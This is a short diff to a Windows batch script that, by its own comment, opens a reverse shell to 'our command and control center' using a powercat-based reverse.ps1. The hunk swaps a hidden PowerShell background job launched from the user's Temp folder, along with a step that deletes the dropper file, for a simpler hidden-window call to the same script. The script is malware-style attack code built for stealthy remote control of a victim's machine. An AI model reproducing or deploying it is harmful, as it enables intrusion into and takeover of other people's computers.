@@ -24,7 +24,4 @@ cd modules
 TIMEOUT /T 10
 
 @REM create a reverse shell connection back to our command and control center (powershell received from powercat module on github)
-powershell -WindowStyle Hidden -c "Start-Job {Set-Location $using:PWD;powershell.exe -WindowStyle Hidden -c '. C:\Users\%username%\AppData\Local\Temp\modules\reverse.ps1'}"
-
-@REM delete phase2
-del %INITIAL_PATH%\%FILE_NAME%"
+powershell -WindowStyle Hidden -c ".\reverse.ps1"
